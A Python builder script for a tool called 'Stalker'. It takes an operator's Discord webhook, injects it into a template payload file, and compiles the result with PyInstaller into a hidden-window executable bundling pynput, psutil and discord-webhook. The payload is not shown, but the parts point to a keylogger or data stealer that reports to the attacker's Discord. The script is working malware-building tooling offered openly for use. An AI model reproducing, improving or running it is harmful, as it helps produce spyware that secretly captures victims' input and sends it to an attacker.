import subprocess
import os
import shutil
from pystyle import *
from time import sleep

Stalker = """
   ▄████████     ███        ▄████████  ▄█          ▄█   ▄█▄    ▄████████    ▄████████ 
  ███    ███ ▀█████████▄   ███    ███ ███         ███ ▄███▀   ███    ███   ███    ███ 
  ███    █▀     ▀███▀▀██   ███    ███ ███         ███▐██▀     ███    █▀    ███    ███ 
  ███            ███   ▀   ███    ███ ███        ▄█████▀     ▄███▄▄▄      ▄███▄▄▄▄██▀ 
▀███████████     ███     ▀███████████ ███       ▀▀█████▄    ▀▀███▀▀▀     ▀▀███▀▀▀▀▀   
         ███     ███       ███    ███ ███         ███▐██▄     ███    █▄  ▀███████████ 
   ▄█    ███     ███       ███    ███ ███▌    ▄   ███ ▀███▄   ███    ███   ███    ███ 
 ▄████████▀     ▄████▀     ███    █▀  █████▄▄██   ███   ▀█▀   ██████████   ███    ███ 
                                      ▀           ▀                        ███    ███ 
"""

System.Size(140, 40)
System.Title("STALKER by NinjaPanic")
System.Clear()
Cursor.HideCursor()

print("\n"*2)
print(Colorate.Vertical(Colors.blue_to_cyan, Center.XCenter(Stalker)))
print("\n"*3)
Write.Print("  [>] Stalker has been created by NinjaPanic on Github | https://github.com/NinjaPanic/Stalker", Colors.blue_to_cyan, interval=0.0125)
Write.Print("\n  [>] Discord server : https://discord.gg/X9MxZ3JnXy", Colors.blue_to_cyan, interval=0.0125)
print("\n"*2)

current_directory = os.getcwd()
sleep(1.5)
webhook = Write.Input("  [>] Enter your Discord Webhook : ", Colors.blue_to_cyan, interval=0.025)
sleep(1.5)
fname = Write.Input("\n\n  [>] Enter the file name : ", Colors.blue_to_cyan, interval=0.025)
sleep(1.5)

with open("Stalker.py", "r") as file:
    f = file.read()

modified = f.replace("WebHook_URL", webhook)

with open(fname + ".py", "w") as file2:
    file2.write(modified)

output_folder = current_directory + "\\EXE" 
input_script = os.path.join(current_directory, f"{fname}.py")

subprocess.run([
    "pyinstaller",
    "--noconfirm",
    "--onefile",
    "--windowed",
    "--collect-submodules=pynput",
    "--collect-submodules=discord-webhook",
    "--collect-submodules=psutil",
    "--distpath", output_folder,
    input_script
], shell=True)

shutil.rmtree('build', ignore_errors=True)
spec_file = fname + ".spec"
if os.path.exists(spec_file):
    os.remove(spec_file)
if os.path.exists(input_script):
    os.remove(input_script)

print("\n"*2)
print(Colorate.Vertical(Colors.blue_to_cyan, Center.XCenter(Stalker)))
print("\n"*3)
Write.Print("  [>] Stalker has been created by NinjaPanic on Github | https://github.com/NinjaPanic/Stalker", Colors.blue_to_cyan, interval=0.0125)
Write.Print("\n  [>] Discord server : https://discord.gg/X9MxZ3JnXy", Colors.blue_to_cyan, interval=0.0125)
print("\n"*2)
Write.Print("  [>] File has successfully been created in /EXE", Colors.blue_to_cyan, interval=0.0125)
sleep(2)